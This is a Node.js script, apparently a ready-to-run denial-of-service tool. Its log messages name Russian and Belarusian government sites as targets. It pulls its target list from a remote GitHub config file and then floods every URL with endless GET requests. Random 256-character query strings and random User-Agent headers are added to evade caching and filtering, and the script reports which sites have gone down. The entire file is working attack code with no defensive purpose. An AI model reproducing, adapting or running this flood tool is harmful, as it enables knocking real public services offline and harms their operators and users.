const axios = require('axios')
const fs = require('fs')
const log = require('log4js').getLogger('dos-attack')

axios.defaults.validateStatus = () => true
log.level = 'INFO'

const LAST_SUCCESS_RESPONSE_TIMEOUT_IN_SECONDS = 60
const SITE_TIMEOUT_IN_MS = 3000
const CHAR_SET = 'АБВГДЕЁЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯабвгдеёжзийклмнопрстуфхцчшщъыьэюяABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
const REMOTE_CONFIG_URL = 'https://raw.githubusercontent.com/JetDeveloper/dos-attack/main/config.json'

function isDown (lastSuccessfulResponseTime) {
  const currentTime = Date.now()
  return Math.abs(currentTime - lastSuccessfulResponseTime) > LAST_SUCCESS_RESPONSE_TIMEOUT_IN_SECONDS * 1000
}

function randomString (len) {
  let randomString = ''
  for (let i = 0; i < len; i++) {
    const randomPosition = Math.floor(Math.random() * CHAR_SET.length)
    randomString += CHAR_SET.substring(randomPosition, randomPosition + 1)
  }
  return randomString
}

function prepareUrl (url) {
  const preparedUrl = url.replace(/_rand_str/g, randomString(256))
  log.debug(preparedUrl)
  return preparedUrl
}

async function main () {
  log.info('Starting to DoS russian/belarusian gov sites')
  log.info('Trying to get remote URL list...')

  let targets
  try {
    const response = await axios(REMOTE_CONFIG_URL)
    targets = response.data.targets
    log.info('Successfully got URL list from remote')
  } catch (e) {
    log.warn('Can\'t get remote list, using backup file...')
    const rawConfig = fs.readFileSync('./config.json')
    targets = JSON.parse(rawConfig).targets
  }

  log.info('Total number URL to DoS:', targets.length)

  let totalRequests = 0
  const requests = targets.reduce((res, target) => {
    res[target] = { requests: 0, successfulResponses: 0, lastSuccessfulResponseTime: Date.now() }
    return res
  }, {})

  setInterval(() => {
    const downSites = []
    const upSites = []
    Object.entries(requests).forEach(([url, r]) => isDown(r.lastSuccessfulResponseTime) ? downSites.push(url) : upSites.push(url))
    log.info(`Total down sites: ${downSites.length}/${Object.keys(requests).length}`)
    if (upSites.length !== 0 && upSites.length < 20) {
      log.info(`Up site names: ${upSites.join(', ')}`)
    }
    log.info(`Total request count: ${totalRequests}`)
  }, 10000)

  while (true) {
    const responses = await axios.all(Object.keys(requests).map(url => axios({
      method: 'get',
      timeout: SITE_TIMEOUT_IN_MS,
      headers: { 'User-Agent': Math.random().toString(34).slice(2) }, // random string 11 symbols length
      url: prepareUrl(url)
    }).catch((e) => {
      requests[url].requests++
    })))

    totalRequests += responses.length

    responses.forEach(r => {
      if (!r) return

      const url = r.config.url
      requests[url].requests++
      if (r.status === 200) {
        requests[url].successfulResponses++
        requests[url].lastSuccessfulResponseTime = Date.now()
      }
    })

    await new Promise(resolve => setTimeout(resolve, 200)) // delay for releasing event-loop for printing logo
  }
}

main().catch(e => log.error(e.stack))